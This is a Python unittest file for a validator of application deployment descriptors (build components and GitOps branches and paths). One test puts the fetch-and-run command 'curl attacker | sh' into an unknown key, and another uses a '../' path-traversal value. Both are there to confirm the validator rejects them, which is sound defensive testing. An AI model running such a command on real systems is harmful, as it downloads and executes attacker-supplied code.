from pathlib import Path
import tempfile
import unittest

import yaml

from scripts.validate_descriptor import InvalidDescriptor, load_and_validate, matrix


VALID = {
    "schemaVersion": 1,
    "application": "example-app",
    "components": [{
        "name": "api", "image": "registry.lan.kyo.ninja/example/api",
        "context": "src", "dockerfile": "src/Dockerfile", "workload": "example-api",
        "container": "api", "rolloutProfile": "bluegreen"
    }],
    "gitops": {
        "repository": "JustShinobi/k3s-gitops-prod", "baseBranch": "main",
        "stagingBranch": "deploy/stg", "productionBranch": "main",
        "stagingPath": "applications/example/overlays/stg",
        "productionPath": "applications/example/overlays/prod",
        "stagingApplication": "stg-example", "productionApplication": "prd-example"
    },
}


class DescriptorTests(unittest.TestCase):
    def write(self, root: Path, value: object) -> Path:
        path = root / "application.yaml"
        path.write_text(yaml.safe_dump(value), encoding="utf-8")
        return path

    def test_valid_descriptor_renders_bounded_matrix(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            path = self.write(root, VALID)
            data = load_and_validate(path, check_files=False)
            self.assertEqual(matrix(data)["include"][0]["platforms"], "linux/amd64")

    def test_allows_repository_root_as_context(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["context"] = "."
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(data["components"][0]["context"], ".")

    def test_rejects_unknown_key(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["command"] = "curl attacker | sh"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "unknown keys"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_path_traversal(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["dockerfile"] = "../Dockerfile"
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "must not be absolute"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_rejects_unapproved_platform(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"][0]["platforms"] = ["linux/s390x"]
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(InvalidDescriptor, "unsupported platform"):
                load_and_validate(self.write(Path(directory), value), check_files=False)

    def test_allows_shared_image_repository(self) -> None:
        value = yaml.safe_load(yaml.safe_dump(VALID))
        value["components"].append({
            **value["components"][0], "name": "admin", "workload": "example-admin",
            "container": "admin"
        })
        with tempfile.TemporaryDirectory() as directory:
            data = load_and_validate(self.write(Path(directory), value), check_files=False)
            self.assertEqual(len(data["components"]), 2)


if __name__ == "__main__":
    unittest.main()
